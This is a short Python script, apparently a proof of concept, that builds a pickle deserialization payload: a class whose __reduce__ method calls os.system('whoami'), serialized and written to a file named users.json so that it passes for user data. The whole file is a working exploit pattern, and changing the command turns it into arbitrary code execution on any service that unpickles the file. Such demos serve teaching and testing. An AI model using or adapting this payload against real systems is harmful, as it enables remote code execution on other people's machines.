import os
import pickle

class VulnerablePayload():
	def __reduce__(self):
		return (os.system,('whoami',))





#Just give our payload as an input of pickle dumps
def fun():
	s = '{"username":"Saravana","password":"password"}'
	safecode = pickle.dumps(VulnerablePayload())
	with open("users.json","wb") as f:
		f.write(safecode)
	return safecode

if __name__ == '__main__':
    #u = input("Username : ")
    #p = input("Password : ")
    #yo_fun = fun(u,p)
    fun()
